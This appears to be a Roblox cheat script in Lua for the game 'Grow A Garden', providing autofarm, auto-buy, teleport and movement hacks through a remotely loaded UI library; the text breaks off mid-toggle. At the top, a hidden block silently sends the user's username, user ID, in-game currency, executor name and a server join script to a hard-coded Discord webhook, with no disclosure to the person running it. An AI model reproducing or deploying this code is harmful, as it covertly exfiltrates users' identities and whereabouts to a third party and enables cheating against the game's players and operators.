local webhookURL = "https://discord.com/api/webhooks/1374135888539553965/A5YV7Rug7dQt5ipUOoawtKT0TgCvHBtv_8dgednK42jvSOPdnGccvIb19i-9-yZZb6Bn"
 local Executor = identifyexecutor()
local player = game.Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local gameId = game.PlaceId
local jobId = game.JobId
local playerCount = #game.Players:GetPlayers()
local ShecklesAmount = game:GetService("Players").LocalPlayer.PlayerGui.Sheckles_UI.TextLabel.Text
--made by olly.exe

local luaJoinScript = [[
local TeleportService = game:GetService("TeleportService")
TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
]]
--made by olly.exe
local embed = {
    ["title"] = "Execution Log",
    ["description"] = "Here are the details of the player and game:",
    ["type"] = "rich",
    ["fields"] = {
        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
        { ["name"] = "Sheckles", ["value"] = ShecklesAmount, ["inline"] = true },
        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
          { ["name"] = "Executor", ["value"] = Executor, ["inline"] = false },
        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
    },
    ["footer"] = { ["text"] = "Execution Log - Roblox" },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}
--made by olly.exe
local payload = game:GetService("HttpService"):JSONEncode({
    ["content"] = "",
    ["embeds"] = {embed}
})
--made by olly.exe
local requestFunction = syn and syn.request or http_request or request
if requestFunction then
    requestFunction({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    Notification("Your executor does not support HTTP requests.", 2, 255, 0, 0)
    if not Executor then
Notification("Your executor does not support | identifyexcutor().", 2, 255, 0, 0)
    end
end

-- Made by olly.exe on discord


function Notification(TEXT, time, R, G, B)
local Notifications = game:GetService("ReplicatedStorage").Notification_UI:Clone()

Notifications.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Frame

Notifications.TextLabel.Text = TEXT

Notifications.TextLabel.TextColor3 = Color3.fromRGB(R, G, B)

wait(time)
for i = 1, 10 do 
    wait(0.01)
Notifications.TextLabel.TextTransparency = Notifications.TextLabel.TextTransparency + 0.1
    end

Notifications:remove()

end
--                                      time  R  G  B
Notification("ty for choosing our script!", 3, 0, 0, 255)


function applyautofarm()
    while true do
        wait(0.05)
        local a = workspace.NPCS["Pet Stand"].EggLocations
        local b = a:GetChildren()
        if carrot then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Carrot")
        end
        if strawberry then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Strawberry")
        end
        if blueberry then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Blueberry")
        end
        if orange_tulip then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Orange Tulip")
        end
        if tomato then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Tomato")
        end
        if corn then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Corn")
        end
        if daffodil then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Daffodil")
        end
        if watermelon then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Watermelon")
        end
        if pumpkin then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Pumpkin")
        end
        if apple then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Apple")
        end
        if bamboo then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Bamboo")
        end
        if coconut then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Coconut")
        end
        if cactus then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Cactus")
        end
        if dragon_fruit then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Dragon Fruit")
        end
        if mango then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Mango")
        end
        if grape then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Grape")
        end
        if mushroom then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Mushroom")
        end
        if pepper then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Pepper")
        end
        if cacao then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Cacao")
        end
        if banana then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Banana")
        end
        if bean then
            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Beanstalk")
        end
        if watering then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Watering Can")
        end
        if trowl then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Trowel")
        end
        if basic then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Basic Sprinkler")
        end
        if advanced then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Advanced Sprinkler")
        end
        if godly then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Godly Sprinkler")
        end
        if light then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Lightning Rod")
        end
        if master then
            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Master Sprinkler")
        end
        if commonegg then
            if b[5] and b[5].Name == "Common Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
            end
            if b[6] and b[6].Name == "Common Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
            end
            if b[4] and b[4].Name == "Common Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
            end
        end
        if uncommonegg then
            if b[5] and b[5].Name == "Uncommon Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
            end
            if b[6] and b[6].Name == "Uncommon Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
            end
            if b[4] and b[4].Name == "Uncommon Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
            end
        end
        if rareegg then
            if b[5] and b[5].Name == "Rare Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
            end
            if b[6] and b[6].Name == "Rare Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
            end
            if b[4] and b[4].Name == "Rare Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
            end
        end
        if legendaryegg then
            if b[5] and b[5].Name == "Legendary Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
            end
            if b[6] and b[6].Name == "Legendary Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
            end
            if b[4] and b[4].Name == "Legendary Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
            end
        end
        if mythicalegg then
            if b[5] and b[5].Name == "Mythical Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
            end
            if b[6] and b[6].Name == "Mythical Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
            end
            if b[4] and b[4].Name == "Mythical Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
            end
        end
        if bugegg then
            if b[5] and b[5].Name == "Bug Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
            end
            if b[6] and b[6].Name == "Bug Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
            end
            if b[4] and b[4].Name == "Bug Egg" then
                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
            end
        end
        --event
if Mysterious then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Mysterious Crate")
end

if NightEgg then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Night Egg")
end

if NightSeedPack then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Night Seed Pack")
end

if BloodBanana then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Banana Seed")
end

if MoonMelon then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Moon Melon Seed")
end

if StarCaller then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Star Caller")
end

if BloodHedgehog then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Hedgehog")
end

if BloodKiwi then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Kiwi")
end

if BloodOwl then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Owl")
end

if ChocolateCarrot then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Chocolate Carrot Seed")
end

if RedLollipop then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Red Lollipop")
end

if CandySunflower then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Candy Sunflower")
end

if EasterEgg then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Easter Egg")
end

if ChocolateSprinkler then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Chocolate Sprinkler")
end

if CandyBlossom then
    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Candy Blossom")
end
    end
end



local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Create the main UI window with a key system
local Window = Rayfield:CreateWindow({
    Name = "Woobee X CatCat Grow A Garden",
    LoadingTitle = "Enjoy",
    LoadingSubtitle = "by CatCat And Woobee",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "GROWAGARDEN"
    },
    KeySystem = false, -- Enable key system
    KeySettings = {
        Title = "WoobeeXCatCat Key System",
        Subtitle = "Enter your access key",
        Note = "Get the key from Woobee or CatCat",
        FileName = "WoobeeCatKey", -- Saves the key for reuse
        SaveKey = false, -- Saves key locally
        GrabKeyFromSite = false, -- Set to true if you host the key on a website
        Key = "WoobeeXCatCatXWindowedHubs" -- Your permanent key
        
    }
})


-- Variables to store current values
local walkSpeed = 16
local jumpPower = 50
local sprintSpeed = 16  -- Default sprint speed
local isSprinting = false

-- Function to apply values to character
local function applyStats()
    local character = game.Players.LocalPlayer.Character
    if character and character:FindFirstChild("Humanoid") then
        character.Humanoid.WalkSpeed = walkSpeed
        character.Humanoid.JumpPower = jumpPower
    end
end

-- Apply again on respawn
game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
    char:WaitForChild("Humanoid")
    task.wait(0.1) -- Slight delay to ensure everything is loaded
    applyStats()
    applyautofarm()
end)

-- Player Tab
local PlayerTab = Window:CreateTab("Player", 4483362458)

-- WalkSpeed Slider
PlayerTab:CreateSlider({
    Name = "WalkSpeed",
    Range = {16, 100},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = walkSpeed,
    Flag = "WalkSpeedSlider",
    Callback = function(Value)
        walkSpeed = Value
        applyStats()
    end,
})

-- JumpHeight Slider
PlayerTab:CreateSlider({
    Name = "JumpHeight",
    Range = {50, 200},
    Increment = 5,
    Suffix = "Height",
    CurrentValue = jumpPower,
    Flag = "JumpHeightSlider",
    Callback = function(Value)
        jumpPower = Value
        applyStats()
    end,
})

-- Infinite Jump Variables
local InfiniteJumpEnabled = false

-- Toggle in UI
local Toggle = PlayerTab:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Flag = "InfiniteJumpToggle",
    Callback = function(Value)
        InfiniteJumpEnabled = Value
    end,
})

-- Infinite Jump Logic
game:GetService("UserInputService").JumpRequest:Connect(function()
    if InfiniteJumpEnabled then
        local player = game.Players.LocalPlayer
        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end)

local WorldTab = Window:CreateTab("World", 4483362458)


local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local originalTime = Lighting.ClockTime
local timeConnection = nil

local alwaysDay = false
local alwaysNight = false

-- We'll store the toggle objects here so we can programmatically update them
local alwaysDayToggleObject = nil
local alwaysNightToggleObject = nil

local function stopTimeOverride()
	if timeConnection then
		timeConnection:Disconnect()
		timeConnection = nil
	end
	Lighting.ClockTime = originalTime
end

alwaysDayToggleObject = WorldTab:CreateToggle({
	Name = "Always Day",
	CurrentValue = false,
	Flag = "AlwaysDayToggle",
	Callback = function(Value)
		if Value then
			-- If Always Night is on, turn it off programmatically (and update UI)
			if alwaysNight then
				alwaysNight = false
				if alwaysNightToggleObject then
					alwaysNightToggleObject:Set(false)
				end
				stopTimeOverride()
			end

			alwaysDay = true
			stopTimeOverride()
			timeConnection = RunService.RenderStepped:Connect(function()
				Lighting.ClockTime = 12
			end)
		else
			alwaysDay = false
			stopTimeOverride()
		end
	end,
})

alwaysNightToggleObject = WorldTab:CreateToggle({
	Name = "Always Night",
	CurrentValue = false,
	Flag = "AlwaysNightToggle",
	Callback = function(Value)
		if Value then
			-- If Always Day is on, turn it off programmatically (and update UI)
			if alwaysDay then
				alwaysDay = false
				if alwaysDayToggleObject then
					alwaysDayToggleObject:Set(false)
				end
				stopTimeOverride()
			end

			alwaysNight = true
			stopTimeOverride()
			timeConnection = RunService.RenderStepped:Connect(function()
				Lighting.ClockTime = 0
			end)
		else
			alwaysNight = false
			stopTimeOverride()
		end
	end,
})


-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to get the closest farm to the player
local function getClosestFarm()
	local farmsFolder = workspace:FindFirstChild("Farm")
	if not farmsFolder then return nil end

	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	local hrp = character:WaitForChild("HumanoidRootPart")

	local closestFarm = nil
	local shortestDistance = math.huge

	for _, farmModel in ipairs(farmsFolder:GetChildren()) do
		local farmInner = farmModel:FindFirstChild("Farm")
		if farmInner and farmInner:IsA("Model") then
			local farmPos = farmInner:GetBoundingBox().Position
			local distance = (hrp.Position - farmPos).Magnitude

			if distance < shortestDistance then
				shortestDistance = distance
				closestFarm = farmInner
			end
		end
	end

	return closestFarm
end

-- Function to toggle visibility of plants in the closest farm
local function setWeightVisibility(visible)
	local closestFarm = getClosestFarm()
	if not closestFarm then
		warn("Could not find the closest farm.")
		return
	end

	local important = closestFarm:FindFirstChild("Important")
	local plantsPhysical = important and important:FindFirstChild("Plants_Physical")

	if not plantsPhysical then
		warn("Could not find Plants_Physical in closest farm.")
		return
	end

	for _, plant in ipairs(plantsPhysical:GetChildren()) do
		-- Look for "2" part (may contain "Weight")
		local part2 = plant:FindFirstChild("2")
		if part2 and part2:IsA("BasePart") then
			part2.Transparency = visible and 1 or 0
			part2.CanCollide = not visible
			part2.CanQuery = not visible
		elseif part2 then
			for _, desc in ipairs(part2:GetDescendants()) do
				if desc.Name == "Weight" and desc:IsA("BasePart") then
					desc.Transparency = visible and 1 or 0
					desc.CanCollide = not visible
					desc.CanQuery = not visible
				end
			end
		end

		
		for _, childPart in ipairs(plant:GetChildren()) do
			if childPart:IsA("BasePart") then
				childPart.Transparency = visible and 1 or 0
				childPart.CanCollide = not visible
				childPart.CanQuery = not visible
			end
		end
	end

	print("Changed visibility for closest farm: " .. closestFarm:GetFullName())
end


WorldTab:CreateToggle({
	Name = "Hide Bushes/Trees (Closest Farm)",
	CurrentValue = false,
	Flag = "ToggleWeightVisibility",
	Callback = function(state)
		setWeightVisibility(state)
	end,
})



local FarmTab = Window:CreateTab("Farm", 4483362458)


-- SERVICES
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")

-- PLAYER
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")
local farms = Workspace:WaitForChild("Farm"):GetChildren()
local teleportDelay = 0.05

-- STATE
local farmRunning = false
local spamRunning = false
local teleportRunning = false
local wasPausedDueToFull = false
local autoFarmEnabled = false -- tracks toggle state

-- Proximity Prompt tracking
local trackedPrompts = {}

-- BACKPACK CHECK
local function isBackpackFull()
	return #player.Backpack:GetChildren() >= 200
end

-- BACKPACK MONITOR LOOP
local function monitorBackpack()
	task.spawn(function()
		while true do
			if wasPausedDueToFull and not isBackpackFull() and autoFarmEnabled then
				wasPausedDueToFull = false
				print("[AutoFarm] Inventory has space again. Resuming farm.")
				startFarm()
			end
			task.wait(1)
		end
	end)
end

-- TWEEN TO POSITION
local function tweenToPosition(targetPosition)
	local distance = (targetPosition - hrp.Position).Magnitude
	local travelTime = math.clamp(distance / 100, 0.05, 0.25)

	local goal = { CFrame = CFrame.new(targetPosition) }
	local tweenInfo = TweenInfo.new(travelTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
	local tween = TweenService:Create(hrp, tweenInfo, goal)
	tween:Play()
	tween.Completed:Wait()
end

-- GET FRUITS FROM FARM
local function getAllFruitParts(farm)
	local fruitParts = {}

	local plantsFolder = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Plants_Physical")
	if not plantsFolder then return fruitParts end

	for _, plant in ipairs(plantsFolder:GetChildren()) do
		local fruits = plant:FindFirstChild("Fruits")
		if fruits then
			for _, fruit in ipairs(fruits:GetChildren()) do
				if fruit:IsA("Model") then
					local part = fruit.PrimaryPart or fruit:FindFirstChildWhichIsA("BasePart")
					if part then
						fruit.PrimaryPart = part
						table.insert(fruitParts, part)
					end
				end
			end
		end
	end

	return fruitParts
end

-- SORT BY DISTANCE
local function getSortedFruitParts(farm)
	local fruitParts = getAllFruitParts(farm)

	table.sort(fruitParts, function(a, b)
		return (a.Position - hrp.Position).Magnitude < (b.Position - hrp.Position).Magnitude
	end)

	return fruitParts
end

-- CLOSEST FARM WITH FRUITS
local function getClosestFarm()
	local closestFarm = nil
	local shortestDistance = math.huge

	for _, farm in ipairs(farms) do
		local fruitParts = getAllFruitParts(farm)
		if #fruitParts > 0 then
			local dist = (fruitParts[1].Position - hrp.Position).Magnitude
			if dist < shortestDistance then
				shortestDistance = dist
				closestFarm = farm
			end
		end
	end

	return closestFarm
end

-- Increase all ProximityPrompt MaxActivationDistance by 30 and track originals
local function increaseProximityDistances()
	for _, prompt in ipairs(Workspace:GetDescendants()) do
		if prompt:IsA("ProximityPrompt") then
			if not trackedPrompts[prompt] then
				trackedPrompts[prompt] = prompt.MaxActivationDistance
			end
			prompt.MaxActivationDistance = prompt.MaxActivationDistance + 30
		end
	end
	print("[AutoFarm] Increased proximity prompt distances by +30")
end

-- Reset ProximityPrompt MaxActivationDistance to original values
local function resetProximityDistances()
	for prompt, originalDistance in pairs(trackedPrompts) do
		if prompt and prompt.Parent then
			prompt.MaxActivationDistance = originalDistance
		end
	end
	trackedPrompts = {}
	print("[AutoFarm] Reset proximity prompt distances to original")
end

-- SPAM KEY USING Heartbeat WAIT
local function startSpamLoop()
	if spamRunning then return end
	spamRunning = true

	task.spawn(function()
		while farmRunning do
			if isBackpackFull() then
				wasPausedDueToFull = true
				print("[AutoFarm] Backpack full, stopping farm.")
				stopFarm()
				break
			end

			pcall(function()
				VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
				RunService.Heartbeat:Wait()
				VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
			end)
			RunService.Heartbeat:Wait()
		end
		spamRunning = false
	end)
end

-- TELEPORT TO FRUITS
local function startTeleportLoop()
	if teleportRunning then return end
	teleportRunning = true

	task.spawn(function()
		while farmRunning do
			if isBackpackFull() then
				wasPausedDueToFull = true
				print("[AutoFarm] Backpack full, stopping farm.")
				stopFarm()
				break
			end

			pcall(function()
				local farm = getClosestFarm()
				if not farm then return end

				local fruitParts = getSortedFruitParts(farm)
				for _, part in ipairs(fruitParts) do
					if not farmRunning or isBackpackFull() then break end
					local targetPos = part.Position + Vector3.new(0, 3, 0)
					tweenToPosition(targetPos)
					task.wait(teleportDelay)
				end
			end)
			task.wait(0.1)
		end
		teleportRunning = false
	end)
end

-- START FARMING
function startFarm()
	if farmRunning then return end
	farmRunning = true
	increaseProximityDistances()
	startSpamLoop()
	startTeleportLoop()
end

-- STOP FARMING
function stopFarm()
	farmRunning = false
	resetProximityDistances()
	print("[AutoFarm] Farming stopped.")
end

-- Start the backpack monitor loop once at script start
monitorBackpack()

-- UI TOGGLE HOOK
FarmTab:CreateToggle({
	Name = "Auto Collect Fruits (Auto)",
	CurrentValue = false,
	Flag = "FarmToggle",
	Callback = function(toggle)
		autoFarmEnabled = toggle
		if toggle then
			print("[AutoFarm] Toggle ON, starting farm.")
			startFarm()
		else
			print("[AutoFarm] Toggle OFF, stopping farm.")
			wasPausedDueToFull = false -- reset pause state when toggled off manually
			stopFarm()
		end
	end
})


local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local autoFarmEnabled = false
local wasPausedDueToFull = false
local farmConnection = nil

-- ⚠️ OPTION 1: If your items are in the Backpack container
local function getBackpackCount()
    return #player.Backpack:GetChildren()
end

--[[
-- ⚠️ OPTION 2: If your item count is displayed in a GUI label (uncomment to use)
local function getBackpackCount()
    local label = player:FindFirstChild("PlayerGui")
        and player.PlayerGui:FindFirstChild("BackpackUI")
        and player.PlayerGui.BackpackUI:FindFirstChild("ItemCount")

    if label and label:IsA("TextLabel") then
        local text = label.Text -- e.g. "Items: 120/200"
        local current = tonumber(string.match(text, "(%d+)%s*/%s*%d+"))
        return current or 0
    end

    return 0
end
]]

local function startFarm()
    if farmConnection then return end

    farmConnection = RunService.RenderStepped:Connect(function()
        if autoFarmEnabled then
            local count = getBackpackCount()

            if count >= 200 then
                if not wasPausedDueToFull then
                    warn("[AutoFarm] Backpack full (200), pausing farm.")
                    wasPausedDueToFull = true
                end
                return -- skip sending key
            else
                if wasPausedDueToFull then
                    print("[AutoFarm] Backpack has room again, resuming farm.")
                    wasPausedDueToFull = false
                end
            end

            -- Simulate E key press
            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
            task.wait(0.05)
            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
        end
    end)
end

local function stopFarm()
    if farmConnection then
        farmConnection:Disconnect()
        farmConnection = nil
    end
end

-- UI Toggle hook
FarmTab:CreateToggle({
    Name = "Auto Collect Fruits (Aura)",
    CurrentValue = false,
    Flag = "FarmToggle",
    Callback = function(toggle)
        autoFarmEnabled = toggle
        if toggle then
            print("[AutoFarm] Toggle ON, starting farm.")
            startFarm()
        else
            print("[AutoFarm] Toggle OFF, stopping farm.")
            wasPausedDueToFull = false
            stopFarm()
        end
    end
})


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

FarmTab:CreateButton({
	Name = "Auto Sell Inventory",
	Callback = function()
		local player = Players.LocalPlayer
		local character = player.Character or player.CharacterAdded:Wait()
		local hrp = character:WaitForChild("HumanoidRootPart")

		local sellEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory")
		local tutorialPoints = Workspace:WaitForChild("Tutorial_Points")
		local tutorialPoint = tutorialPoints:WaitForChild("Tutorial_Point_2")

		local originalCFrame = hrp.CFrame

		-- Move to sell point
		hrp.CFrame = tutorialPoint.CFrame + Vector3.new(0, 3, 0)

		task.delay(0.2, function()
			pcall(function()
				sellEvent:FireServer()

				local updatedChar = player.Character or player.CharacterAdded:Wait()
				if updatedChar:FindFirstChild("HumanoidRootPart") then
					updatedChar.HumanoidRootPart.CFrame = originalCFrame
				end
			end)
		end)
	end,
})


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local hrp = character:WaitForChild("HumanoidRootPart")

local sellEvent = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Sell_Inventory")
local tutorialPoint = Workspace:WaitForChild("Tutorial_Points"):WaitForChild("Tutorial_Point_2")

local autoSellEnabled = false
local maxBackpackSize = 200 -- change this to your actual max capacity

-- Toggle UI using Rayfield
FarmTab:CreateToggle({
	Name = "Auto Sell When Full",
	CurrentValue = false,
	Callback = function(Value)
		autoSellEnabled = Value
	end,
})

-- Function to check if backpack is full (based on item count)
function isBackpackFull()
	local backpack = player:FindFirstChild("Backpack")
	if backpack then
		local itemCount = #backpack:GetChildren()
		return itemCount >= maxBackpackSize
	end
	return false
end

-- Function to auto sell
local function autoSellInventory()
	local originalCFrame = hrp.CFrame

	-- Move to the sell point
	hrp.CFrame = tutorialPoint.CFrame + Vector3.new(0, 3, 0)

	task.delay(0.27, function()
		sellEvent:FireServer()
    task.wait(0.4)
		-- Return to original position
		local updatedChar = player.Character
		if updatedChar and updatedChar:FindFirstChild("HumanoidRootPart") then
			updatedChar.HumanoidRootPart.CFrame = originalCFrame
		end
	end)
end

-- Loop to check if backpack is full
task.spawn(function()
	while true do
		task.wait(1)
		if autoSellEnabled and isBackpackFull() then
			autoSellInventory()
		end
	end
end)


Players = game:GetService("Players")
RunService = game:GetService("RunService")

player = Players.LocalPlayer
backpack = player:WaitForChild("Backpack")

looping = false
loopConnection = nil

function hasSpecialParticleEmitter(tool)
    handle = tool:FindFirstChild("Handle")
    if handle then
        for _, child in pairs(handle:GetChildren()) do
            if child:IsA("ParticleEmitter") then
                return true
            end
        end
    end
    return false
end

function favoriteByAttribute(tool)
    if not tool:GetAttribute("Favorite") then
        tool:SetAttribute("Favorite", true)
    end
end

function favoriteSpecialFruits()
    for _, tool in pairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and hasSpecialParticleEmitter(tool) then
            favoriteByAttribute(tool)
        end
    end
end

FarmTab:CreateToggle({
    Name = "Auto-Favorite Moonlit/gold/rainbow Fruits",
    CurrentValue = false,
    Flag = "AutoFavoriteToggle",
    Callback = function(state)
        looping = state
        if looping then
            loopConnection = RunService.Heartbeat:Connect(function()
                favoriteSpecialFruits()
            end)
        else
            if loopConnection then
                loopConnection:Disconnect()
                loopConnection = nil
            end
        end
    end,
})


local Tab = Window:CreateTab("Auto Buy", 4483362458)

local Section = Tab:CreateSection("seeds")

local Toggle = Tab:CreateToggle({
   Name = "auto buy carrot", 
   CurrentValue = false,
   Flag = "carrot", 
   Callback = function(Value)
      if Value then
         carrot = true
         Notification("carrot auto buy active!", 0.5, 255, 0, 0)
      elseif not Value then
         carrot = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy strawberry", 
   CurrentValue = false,
   Flag = "strawberry", 
   Callback = function(Value)
      if Value then
          Notification("strawberry auto buy active!", 0.5, 255, 0, 0)
         strawberry = true
      elseif not Value then
         strawberry = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy blueberry", 
   CurrentValue = false,
   Flag = "blueberry", 
   Callback = function(Value)
      if Value then
          Notification("blueberry auto buy active!", 0.5, 255, 0, 0)
         blueberry = true
      elseif not Value then
         blueberry = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy orange tulip", 
   CurrentValue = false,
   Flag = "orange_tulip", 
   Callback = function(Value)
      if Value then
          Notification("orange tulip auto buy active!", 0.5, 255, 0, 0)
         orange_tulip = true
      elseif not Value then
         orange_tulip = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy tomato", 
   CurrentValue = false,
   Flag = "tomato", 
   Callback = function(Value)
      if Value then
          Notification("tomato auto buy active!", 0.5, 255, 0, 0)
         tomato = true
      elseif not Value then
         tomato = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy corn", 
   CurrentValue = false,
   Flag = "corn", 
   Callback = function(Value)
      if Value then
          Notification("corn auto buy active!", 0.5, 255, 0, 0)
         corn = true
      elseif not Value then
         corn = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy daffodil", 
   CurrentValue = false,
   Flag = "daffodil", 
   Callback = function(Value)
      if Value then
          Notification("daffodil auto buy active!", 0.5, 255, 0, 0)
         daffodil = true
      elseif not Value then
         daffodil = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy watermelon", 
   CurrentValue = false,
   Flag = "watermelon", 
   Callback = function(Value)
      if Value then
          Notification("watermelon auto buy active!", 0.5, 255, 0, 0)
         watermelon = true
      elseif not Value then
         watermelon = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
   Name = "auto buy pumpkin", 
   CurrentValue = false,
   Flag = "pumpkin", 
   Callback = function(Value)
      if Value then
          Notification("pumpkin auto buy active!", 0.5, 255, 0, 0)
         pumpkin = true
      elseif not Value then
         pumpkin = false
      end
   end,
})

local Toggle = Tab:CreateToggle({
